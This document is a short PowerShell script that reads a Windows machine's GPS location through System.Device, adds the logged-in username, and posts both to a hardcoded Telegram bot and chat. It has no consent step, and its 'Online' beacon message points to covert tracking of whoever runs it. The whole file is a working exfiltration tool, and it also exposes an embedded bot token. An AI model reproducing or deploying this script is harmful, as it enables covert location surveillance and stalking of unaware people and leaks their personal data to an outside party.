$botToken = '6899690141:AAENcDCrG8znTahm-5WB8R7UIZoOPEZTSBQ'
$chatId = '5998953011'

# Load System.Device assembly
Add-Type -AssemblyName System.Device

# Create a GeoCoordinateWatcher object
$watcher = New-Object System.Device.Location.GeoCoordinateWatcher

# Start the watcher
$watcher.Start()

# Wait for the position to be determined (you can adjust the timeout as needed)
$timeout = 10
while (($watcher.Status -ne 'Ready') -and ($timeout -gt 0)) {
    Start-Sleep -Seconds 1
    $timeout--
}

# Check if the watcher is ready
if ($watcher.Status -eq 'Ready') {
    # Get the current position
    $position = $watcher.Position.Location
    $username = $env:USERNAME
    $textMessage = "Online | Username: $username | Latitude: $($position.Latitude), Longitude: $($position.Longitude)"
} else {
    $textMessage = "Failed to determine the GPS location."
}

# Stop the watcher
$watcher.Stop()

# Send message to Telegram
$apiUrl = "https://api.telegram.org/bot$botToken/sendMessage"
$params = @{
    'chat_id'    = $chatId
    'text'       = $textMessage
}
$jsonParams = $params | ConvertTo-Json
$response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $jsonParams -ContentType 'application/json'
Write-Output $response
